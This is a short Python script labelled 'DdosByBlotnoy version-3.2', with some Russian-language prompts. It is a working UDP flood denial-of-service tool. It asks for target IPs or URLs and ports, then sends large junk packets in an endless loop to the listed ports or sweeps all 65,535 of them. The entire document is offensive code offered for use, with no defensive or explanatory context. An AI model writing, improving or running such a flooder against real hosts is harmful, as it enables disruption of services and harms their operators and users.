import os
import socket
import random
import time
import colorama
from colorama import Fore, Back, Style
colorama.init()

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print(Fore.GREEN)
print("DdosByBlotnoy")
print("version-3.2")

bytes = "qwerty"*2000
sent = 0
max = 1000

ips = input("IP/URL : ")
ips = (ips+",").split(",")
ips.pop()

ports = input("ports/all :  ")
if ports != "all":
     ports = (ports+",").split(",")
     ports.pop()

mode = input("Включить медленный режим? (y; n): ")

os.system("clear")
print("running")
time.sleep(0.5)


def attack(ip, port):
	global sent
	global max
	
	sock.sendto(str.encode(bytes), (ip,int(port)))
	sent += 1
	print("%s packets - %s:%s"%(sent,ip,port))

	if mode == "y":
		if sent == max:
			max += 1000
			time.sleep(0.5)


port_for_fast = 1
while True:
	for ip in ips:
		try:
			if ports != "all":
				for port in ports:
					attack(ip, port)
			else:
				attack(ip, port_for_fast)
				
				port_for_fast += 1
				if port_for_fast == 65536:
					port_for_fast = 1
		except:
			print(Fore.RED)
			print("ip "+ip+" отвалился!")
			